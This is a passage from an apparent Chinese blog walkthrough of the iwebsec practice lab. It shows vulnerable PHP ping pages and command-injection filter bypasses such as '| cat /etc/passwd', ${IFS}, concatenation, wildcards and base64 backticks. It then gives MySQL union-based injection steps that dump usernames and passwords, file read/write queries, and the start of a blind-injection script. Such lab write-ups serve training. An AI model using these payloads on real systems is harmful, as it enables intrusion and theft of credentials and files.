class="line">        &#125;else&#123;</span><br><span class="line">                exit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>require_once嵌套一个header.php在里面</p><p>html的内容仅仅包含了两个标题以及显示将要ping的IP地址的段落</p><p>源码表示没对其做任何的过滤，仅仅就只需要在ip地址后面加入命令连接符号就可以渗透</p><p>他都这么有诚意了那咱也不好意思辜负人家的希望对吧</p><p><a href="https://imgse.com/i/pkqQaMn"><img src="https://s21.ax1x.com/2024/07/27/pkqQaMn.png" alt="pkqQaMn.png"></a></p><p>直接就是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1 | cat /etc/passwd</span><br></pre></td></tr></table></figure></p><h2 id="02"><a href="#02" class="headerlink" title="02"></a>02</h2><p>同理看源码<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[root@bc23a49cb37c /]# ls</span><br><span class="line">bin   dev  home  lib64       media  opt        proc  sbin     srv       sys  usr</span><br><span class="line">boot  etc  lib   lost+found  mnt    php-build  root  selinux  start.sh  tmp  var</span><br><span class="line">[root@bc23a49cb37c /]# cd var</span><br><span class="line">[root@bc23a49cb37c var]# ls</span><br><span class="line">cache  empty  lib    lock  mail  opt       run    tmp  yp</span><br><span class="line">db     games  local  log   nis   preserve  spool  www</span><br><span class="line">[root@bc23a49cb37c var]# cd www</span><br><span class="line">[root@bc23a49cb37c www]# ls</span><br><span class="line">cgi-bin  error  html  icons  manual</span><br><span class="line">[root@bc23a49cb37c www]# cd html</span><br><span class="line">[root@bc23a49cb37c html]# ls</span><br><span class="line">css       exec      fi          header.php  middleware  php.php  ssrf         upload  xxe</span><br><span class="line">database  execcode  footer.php  index.php   parse       sqli     unserialize  xss</span><br><span class="line">[root@bc23a49cb37c html]# cd exec</span><br><span class="line">[root@bc23a49cb37c exec]# ls</span><br><span class="line">01.php  02.php  03.php  04.php  05.php  css</span><br><span class="line">[root@bc23a49cb37c exec]# cat 02*</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  require_once(&#x27;../header.php&#x27;);</span><br><span class="line">  ?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">                &lt;title&gt;命令执行漏洞空格绕过&lt;/title&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;h2&gt;命令执行漏洞空格绕过&lt;/h2&gt;</span><br><span class="line">                &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">                        &lt;p&gt;/02.php?ip=127.0.0.1&lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">        if(isset($_GET[&#x27;ip&#x27;]))&#123;</span><br><span class="line"></span><br><span class="line">                if (preg_match(&#x27;/ /&#x27;, $_GET[&#x27;ip&#x27;])) &#123;</span><br><span class="line">                die(&#x27;error!!!&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line">                else&#123;</span><br><span class="line">                        $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">    system(&quot;ping -c 2 &quot;.$ip);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                exit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">if (preg_match(&#x27;/ /&#x27;, $_GET[&#x27;ip&#x27;]))</span><br></pre></td></tr></table></figure></p><p>空格的话有挺多可以替换的</p><h3 id="制表符"><a href="#制表符" class="headerlink" title="制表符"></a>制表符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%09</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pkqQDaT"><img src="https://s21.ax1x.com/2024/07/27/pkqQDaT.png" alt="pkqQDaT.png"></a></p><h2 id=""><a href="#" class="headerlink" title="#"></a>#</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pkqQ6G4"><img src="https://s21.ax1x.com/2024/07/27/pkqQ6G4.png" alt="pkqQ6G4.png"></a></p><h2 id="-1"><a href="#-1" class="headerlink" title="#"></a>#</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure><p><code>&#123;cat,/etc/passwd&#125;</code><br><a href="https://imgse.com/i/pkqQRMR"><img src="https://s21.ax1x.com/2024/07/27/pkqQRMR.png" alt="pkqQRMR.png"></a></p><h2 id="-2"><a href="#-2" class="headerlink" title="#"></a>#</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pkqQfqx"><img src="https://s21.ax1x.com/2024/07/27/pkqQfqx.png" alt="pkqQfqx.png"></a></p><h2 id="-3"><a href="#-3" class="headerlink" title="#"></a>#</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$IFS$9</span><br></pre></td></tr></table></figure><p>和<code>$&#123;IFS&#125;</code>一样，我就不贴图了</p><h2 id="03"><a href="#03" class="headerlink" title="03"></a>03</h2><p>03的源码好像被我玩没了…汗</p><p><a href="https://i-blog.csdnimg.cn/blog_migrate/74f16ec3e63d87817b77479ae23edc3e.png">https://i-blog.csdnimg.cn/blog_migrate/74f16ec3e63d87817b77479ae23edc3e.png</a></p><p>嫖了wp的图片，，，，就这样吧毁灭吧烦了</p><p>明确的过滤了cat，那我们可以用tac</p><p>好吧,nothing，，，，好吧，后面发现是我把环境炸了…难评，理论上tac也可以</p><h3 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;a=ca;b=t;$a$b%20/etc/passwd</span><br></pre></td></tr></table></figure><h3 id="替换cat的命令"><a href="#替换cat的命令" class="headerlink" title="替换cat的命令"></a>替换cat的命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">sh /etc/passwd 2&gt;%261 //报错出文件内容</span><br></pre></td></tr></table></figure><p>环境被我炸了我也懒得重打一边了（最后还是重新找着wp重写了一个)<br><a href="https://imgse.com/i/pkLCoff"><img src="https://s21.ax1x.com/2024/07/29/pkLCoff.png" alt="pkLCoff.png"></a><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  require_once(&#x27;../header.php&#x27;);</span><br><span class="line">  ?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">                &lt;title&gt;命令执行漏洞命令绕过&lt;/title&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;h2&gt;命令执行漏洞绕过&lt;/h2&gt;</span><br><span class="line">                &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">                        &lt;p&gt;/03.php?ip=127.0.0.1&lt;/p&gt;</span><br><span class="line">                        &lt;p&gt;cat命令执行&lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">        if(isset($_GET[&#x27;ip&#x27;]))&#123;</span><br><span class="line"></span><br><span class="line">                if (preg_match(&#x27;/cat/&#x27;, $_GET[&#x27;ip&#x27;])) &#123;</span><br><span class="line">                die(&#x27;error!!!&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line">                else&#123;</span><br><span class="line">                        $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">    system(&quot;ping -c 2 &quot;.$ip);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                exit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>tac 和拼接都是可以的</p><p>其他的也可以但我就试了这两个<br><a href="https://imgse.com/i/pkLCH1S"><img src="https://s21.ax1x.com/2024/07/29/pkLCH1S.png" alt="pkLCH1S.png"></a><br><a href="https://imgse.com/i/pkLCb6g"><img src="https://s21.ax1x.com/2024/07/29/pkLCb6g.png" alt="pkLCb6g.png"></a></p><h2 id="04"><a href="#04" class="headerlink" title="04"></a>04</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  require_once(&#x27;../header.php&#x27;);</span><br><span class="line">  ?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">                &lt;title&gt;命令执行漏洞通配符绕过&lt;/title&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;h2&gt;命令执行漏洞通配符绕过&lt;/h2&gt;</span><br><span class="line">                &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">                        &lt;p&gt;/04.php?ip=127.0.0.1&lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">        if(isset($_GET[&#x27;ip&#x27;]))&#123;</span><br><span class="line"></span><br><span class="line">                if (preg_match(&#x27;/etc|passwd/&#x27;, $_GET[&#x27;ip&#x27;])) &#123;</span><br><span class="line">                die(&#x27;error!!!&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line">                else&#123;</span><br><span class="line">                        $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">    system(&quot;ping -c 2 &quot;.$ip);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                exit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了etc|passwd关键字</p><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><p>?和*，懂得都懂<br><a href="https://imgse.com/i/pkLCqXQ"><img src="https://s21.ax1x.com/2024/07/29/pkLCqXQ.png" alt="pkLCqXQ.png"></a></p><h2 id="05"><a href="#05" class="headerlink" title="05"></a>05</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  require_once(&#x27;../header.php&#x27;);</span><br><span class="line">  ?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">                &lt;title&gt;命令执行漏洞base64编码绕过&lt;/title&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;h2&gt;命令执行漏洞base64编码绕过&lt;/h2&gt;</span><br><span class="line">                &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">                        &lt;p&gt;/05.php?ip=127.0.0.1&lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">        if(isset($_GET[&#x27;ip&#x27;]))&#123;</span><br><span class="line"></span><br><span class="line">                if (preg_match(&#x27;/id/&#x27;, $_GET[&#x27;ip&#x27;])) &#123;</span><br><span class="line">                die(&#x27;error!!!&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line">                else&#123;</span><br><span class="line">                        $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">    system(&quot;ping -c 2 &quot;.$ip);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                exit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了关键字id</p><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>先将id进行base64加密<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@bc23a49cb37c exec]# echo id|base64</span><br><span class="line">aWQK</span><br><span class="line">[root@bc23a49cb37c exec]# echo aWQK | base64 -d</span><br><span class="line">id</span><br></pre></td></tr></table></figure></p><p>反引号括起来的值会被当做命令执行，于是使用如下命令替换</p><p><code>ip=127.0.0.1;`echo aWQK|base64 -d` </code></p><p>成功</p><p><a href="https://imgse.com/i/pkLC7p8"><img src="https://s21.ax1x.com/2024/07/29/pkLC7p8.png" alt="pkLC7p8.png"></a></p><p>至此</p><p>iwebsec的rec结束</p><h1 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h1><h2 id="mysql基本用法"><a href="#mysql基本用法" class="headerlink" title="mysql基本用法"></a>mysql基本用法</h2><p>mysql常用的语句就是查库查表查列查字段<br>分别对应下面<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1）查库：select schema_name from information_schema.schemata;</span><br><span class="line">2) 查表：select table_name from information_schema.tables where table_schema=&#x27;security&#x27;;</span><br><span class="line">3）查列：select column_name from information_schema.columns where table_name=&#x27;users&#x27;;</span><br><span class="line">4) 查字段：select username,password from security.users;</span><br></pre></td></tr></table></figure><br>mysql注释<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--+</span><br><span class="line">--       --后面有一个空格</span><br><span class="line">#</span><br></pre></td></tr></table></figure><br>limit<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from where id=&quot;?&quot; limit 0,1</span><br><span class="line">limit 0,1;其中第一位是从第几个开始，比如0代表从第一个开始，而第二位的1代表的就是显示多少个数据。</span><br></pre></td></tr></table></figure><br>单引号判断<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id参数左右有无单双引号，括号等方式闭合</span><br><span class="line">最典的是 http://xxx/xxx.php?id=1&#x27;</span><br><span class="line">如果返回错误就说明存在sql注入，因为无论字符型还是整型都会因为单引号个数不匹配而报错</span><br></pre></td></tr></table></figure><br>order by<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by n：通过第n列进行排序，默认升序。</span><br><span class="line">用来判断表中的数据有多少列，用二分法进行测试。</span><br></pre></td></tr></table></figure><br>mysql函数<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1） SYSTEM_USER()返回当前用户；SELECT SYSTEM_USER();</span><br><span class="line">2） USER()返回当前用户SELECT USER();</span><br><span class="line">3） CURRENT_USER()返回当前用户SELECT CURRENT_USER();</span><br><span class="line">4） DATABASE()返回当前数据库名SELECT DATABASE();  </span><br><span class="line">5） VERSION()返回数据库的版本号SELECT VERSION()；</span><br><span class="line">6） @@datadir返回mysql安装路径SELECT @@DATADIR;</span><br><span class="line">7） @@version_compile_os返回当前操作系统SELECT @@version_compile_os；</span><br><span class="line">8)  GROUP_CONCAT()将所有的数据拼接后作为一行进行显示</span><br><span class="line">9） CONCAT_WS(&#x27;~&#x27;,A,B)以A~B的形式将数据显示出来</span><br><span class="line">10) left()函数：  left(database(),1)=‘s’            left(a,b)从左侧截取a的前b位，正确则返回1，错误则返回0</span><br><span class="line">11) regexp函数：  select user() regexp ‘r’          user()的结果是root，regexp为匹配root的正则表达式</span><br><span class="line">12) like函数：    select user() like ‘ro%’          匹配与regexp相似。</span><br><span class="line">13) substr(a,b,c)   select substr() XXXX           substr(a,b,c)从位置b开始，截取a字符串c位长度</span><br><span class="line">SUBSTR(str,pos): pos开始的位置，一直截取到最后</span><br><span class="line">14) ascii()         将某个字符串转化为ascii值  </span><br><span class="line">15) chr(数字)   或者是ord(‘字母’)    使用python中的两个函数可以判断当前的ascii值是多少</span><br><span class="line">16）CONCAT(str1,str2,…)     返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</span><br><span class="line">17）mid(str,pos,len)  与substr类似</span><br></pre></td></tr></table></figure><br>还有一个<a href="https://blog.csdn.net/u012620150/article/details/81945004">mysql之group_concat函数详解</a></p><p>读写文件<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">into outfile 写文件                                        </span><br><span class="line">用法： select &#x27;mysql is very good&#x27; into outfile &#x27;test1.txt‘;</span><br><span class="line">文件位置： C:\phpstudy\PHPTutorial\MySQL\data</span><br><span class="line"></span><br><span class="line">或者是select &#x27;crow 666&#x27; into outfile &#x27;C:\\phpstudy\\PHPTutorial\\WWW\\sqli\\Less-7\\test.txt’;</span><br><span class="line">文件位置： C:\phpstudy\PHPTutorial\WWW\sqli\Less-7</span><br><span class="line">注意事项： \\</span><br><span class="line"></span><br><span class="line">load_file()  读取本地文件  select load_file(&#x27;C:\\phpstudy\\PHPTutorial\\WWW\\sqli\\Less-7\\test.txt’);</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>常用判断注入点方法<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1）&#x27;</span><br><span class="line">2)&#x27;)</span><br><span class="line">3) &#x27;))</span><br><span class="line">4) &quot;</span><br><span class="line">5) &quot;)</span><br><span class="line">6) &quot;))</span><br></pre></td></tr></table></figure><br>handler命令，是smysql专属的，可以让我们一行一行得到一个表中的数据<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"> </span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &amp;lt;= | &amp;gt;= | &amp;lt; | &amp;gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"> </span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure></p><ul><li>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</li><li>通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</li><li>通过HANDLER tbl_name CLOSE来关闭打开的句柄。通过索引去查看的话可以按照一定的顺序，获取表中的数据。</li><li>通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。 通过索引列指定一个值，可以指定从哪一行开始。</li><li>通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。 如果我们不想浏览一个表的所有行，可以使用where和limit子句。</li></ul><h2 id="01数字型注入"><a href="#01数字型注入" class="headerlink" title="01数字型注入"></a>01数字型注入</h2><h3 id="tap1-判断是否存在注入"><a href="#tap1-判断是否存在注入" class="headerlink" title="tap1 判断是否存在注入"></a>tap1 判断是否存在注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.137/sqli/01.php?id=1%27</span><br></pre></td></tr></table></figure><p>下面报错，说明存在sql注入漏洞</p><h3 id="tap2-判断诸如类型"><a href="#tap2-判断诸如类型" class="headerlink" title="tap2 判断诸如类型"></a>tap2 判断诸如类型</h3><p>题目都给说了，数字型</p><h3 id="tap3-判断列数"><a href="#tap3-判断列数" class="headerlink" title="tap3 判断列数"></a>tap3 判断列数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1 ordre by 4</span><br><span class="line">这里的报错是unknown column 4 in order caluse说明没有四列</span><br><span class="line">?id=-1 union select 1,2,3</span><br><span class="line">这里要在1前面加一个-白哦是不显示内容，</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pkLkqCq"><img src="https://s21.ax1x.com/2024/07/29/pkLkqCq.png" alt="pkLkqCq.png"></a><br><a href="https://imgse.com/i/pkLkL80"><img src="https://s21.ax1x.com/2024/07/29/pkLkL80.png" alt="pkLkL80.png"></a></p><h3 id="tap4-爆库"><a href="#tap4-爆库" class="headerlink" title="tap4 爆库"></a>tap4 爆库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,database()</span><br><span class="line">?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pkLkzb4"><img src="https://s21.ax1x.com/2024/07/29/pkLkzb4.png" alt="pkLkzb4.png"></a><br><a href="https://imgse.com/i/pkLkvKU"><img src="https://s21.ax1x.com/2024/07/29/pkLkvKU.png" alt="pkLkvKU.png"></a></p><h3 id="tap5-爆表"><a href="#tap5-爆表" class="headerlink" title="tap5 爆表"></a>tap5 爆表</h3><p><a href="https://imgse.com/i/pkLkxrF"><img src="https://s21.ax1x.com/2024/07/29/pkLkxrF.png" alt="pkLkxrF.png"></a></p><h3 id="tap6-爆列"><a href="#tap6-爆列" class="headerlink" title="tap6 爆列"></a>tap6 爆列</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.137/sqli/01.php?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pkLAAxK"><img src="https://s21.ax1x.com/2024/07/29/pkLAAxK.png" alt="pkLAAxK.png"></a></p><h3 id="tap7-爆数据"><a href="#tap7-爆数据" class="headerlink" title="tap7 爆数据"></a>tap7 爆数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,2,group_concat(concat_ws(&#x27;~&#x27;,username,password)) from iwebsec.sqli</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pkLAk26"><img src="https://s21.ax1x.com/2024/07/29/pkLAk26.png" alt="pkLAk26.png"></a></p><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>我靠，还是特么的宽字节注入，后面再说，这个跟上面的数字型差不多,我下面宽字节再讲吧</p><h2 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h2><p>盲注就是无回显的注入<br><a href="https://imgse.com/i/pkL8M2F"><img src="https://s21.ax1x.com/2024/07/29/pkL8M2F.png" alt="pkL8M2F.png"></a><br><a href="https://imgse.com/i/pkL8K8U"><img src="https://s21.ax1x.com/2024/07/29/pkL8K8U.png" alt="pkL8K8U.png"></a></p><p>可以看出，一个有回显一个没有，对于这种类型的盲注一般直接跑脚本就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># @Author:refeng</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">strings = string.printable</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"># url = &#x27;http://192.168.159.137/sqli/03.php&#x27;</span><br><span class="line">for i in range(1,60):</span><br><span class="line">    for j in strings:</span><br><span class="line">        # 爆库</span><br><span class="line">        # url = 